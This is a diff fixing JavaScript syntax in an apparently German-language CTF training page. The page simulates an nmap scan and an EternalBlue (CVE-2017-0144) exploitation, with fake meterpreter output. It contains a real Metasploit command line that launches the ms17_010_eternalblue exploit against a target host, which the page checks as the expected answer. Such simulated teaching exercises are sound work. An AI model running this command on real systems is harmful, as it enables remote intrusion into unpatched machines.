@@ -151,7 +151,7 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
       </pre>
       <div class="input-section">
         <input type="text" id="exploit-command" placeholder="Befehl eingeben...">
-        <button class="btn" onclick="checkExploit">Exploit ausführen</button>
+        <button class="btn" onclick="checkExploit()">Exploit ausführen</button>
       </div>
       <div class="console" id="console-2"></div>
     </div>
@@ -175,7 +175,7 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
       }
 
       console1.innerHTML += `Starte erweiterten Scan für ${target} mit Parametern (-A -sS -sV -O)...\n`;
-      setTimeout( => {
+      setTimeout(() => {
         if (target === "RHOST1") {
           console1.innerHTML += `
 Nmap Scan Report for 192.168.1.10
@@ -187,7 +187,7 @@ PORT      STATE SERVICE
 3389/tcp  open  ms-wbt-server
 -------------------------------------------------
 OS Details: Windows 10 Pro, fully patched.
-          `.trim + "\n\n";
+          `.trim() + "\n\n";
         } else if (target === "RHOST2") {
           console1.innerHTML += `
 Nmap Scan Report for 192.168.1.20
@@ -200,7 +200,7 @@ PORT      STATE SERVICE
 -------------------------------------------------
 OS Details: Windows 7 SP1, unpatched.
 Vulnerability: CVE-2017-0144 (EternalBlue) detected via smb-vuln-ms17-010 script.
-          `.trim + "\n\n";
+          `.trim() + "\n\n";
         }
         scanResults[target] = true;
         button.disabled = true;
@@ -212,23 +212,23 @@ Vulnerability: CVE-2017-0144 (EternalBlue) detected via smb-vuln-ms17-010 script
       }, 2000);
     }
 
-    function checkExploit {
-      const input = document.getElementById("exploit-command").value.trim;
+    function checkExploit() {
+      const input = document.getElementById("exploit-command").value.trim();
       const console2 = document.getElementById("console-2");
       const expectedCommand = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST 192.168.1.20; run"';
 
       if (input === expectedCommand) {
         console2.innerHTML = "Starte Exploit...\n";
-        setTimeout( => {
+        setTimeout(() => {
           console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
-          setTimeout( => {
+          setTimeout(() => {
             console2.innerHTML += "\nmeterpreter > ls\n";
             console2.innerHTML += " Directory of C:\\Users\\Victim\\Desktop\n";
             console2.innerHTML += " flag.txt\n";
             console2.innerHTML += " confidential.docx\n";
-            setTimeout( => {
+            setTimeout(() => {
               console2.innerHTML += "\nmeterpreter > cd Desktop\n";
-              setTimeout( => {
+              setTimeout(() => {
                 console2.innerHTML += "meterpreter > cat flag.txt\n";
                 console2.innerHTML += "Flag: {PATCH_THE_PATCH}\n";
               }, 2000);
